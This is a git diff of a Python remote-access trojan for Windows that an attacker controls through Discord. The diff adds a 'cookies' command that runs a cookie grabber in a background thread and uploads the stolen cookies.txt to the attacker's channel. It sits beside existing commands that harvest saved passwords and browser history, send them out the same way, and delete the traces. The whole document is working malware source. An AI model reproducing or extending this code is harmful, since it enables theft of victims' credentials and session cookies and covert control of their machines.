@@ -22,6 +22,7 @@ import winreg
 import pyautogui
 from resources.misc import *
 from resources.passwords_grabber import *
+from resources.get_cookies import *
 
 ###############################################################################
 ##                                                                           ##
@@ -35,7 +36,6 @@ from resources.passwords_grabber import *
 ##   Everything you do, you are doing at your own risk and responsibility.   ##
 ##                                                                           ##
 ###############################################################################
-
 
 
 
@@ -70,6 +70,7 @@ text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
+cookies_thread = None
 working_directory = sys.argv[0].split('\\')[:-1]
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
@@ -85,7 +86,7 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 
 @client.event
 async def on_ready():
-    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids
+    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread
     await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```[' + current_time() + '] New PC session```')
 
     recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
@@ -114,6 +115,12 @@ async def on_ready():
                 await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1]).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                 await asyncio.sleep(0.1)
             embeds_to_send = []
+        if os.path.exists('ready.cookies') and cookies_thread != None:
+            await asyncio.sleep(1)
+            reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File('cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
+            os.system('del cookies.txt')
+            os.system('del ready.cookies')
+            cookies_thread = None
         await asyncio.sleep(1)
 
 @client.event
@@ -234,7 +241,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread
     if message.author != client.user:
         if message.content == '.ss':
             await message.delete()
@@ -457,16 +464,24 @@ async def on_message(message):
                 grab_passwords()
                 reaction_msg = await message.channel.send('``Grabbed passwords:``', file=discord.File('credentials.txt', filename='credentials.txt')); await reaction_msg.add_reaction('📌')
                 os.system('del credentials.txt')
+
             elif message.content[6:] == 'history':
                 with open('history.txt', 'w') as history:
                     for entry in get_history().histories:
                         history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
                 reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
                 os.system('del history.txt')
+            
+            elif message.content[6:] == 'cookies':
+                if cookies_thread == None:
+                    cookies_thread = Thread(target=grab_cookies); cookies_thread.start()
+                    await message.channel.send('```Grabbing cookies. Please wait...```')
+                else:
+                    reaction_msg = await message.channel.send('``Cookies are being collected. Please be patient...``'); await reaction_msg.add_reaction('🔴')
 
         elif expectation == 'onefile':
-            split_v1 = str(message.attachments).split("filename='")[1]
-            filename = str(split_v1).split("' ")[0]
+            split_v1 = str(message.attachments).split('filename=\'')[1]
+            filename = str(split_v1).split('\' ')[0]
             reaction_msg = await message.channel.send('```This file will be uploaded to  ' + '/'.join(working_directory) + '/' + filename + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```')
             await reaction_msg.add_reaction('📤')
             await reaction_msg.add_reaction('🔴')
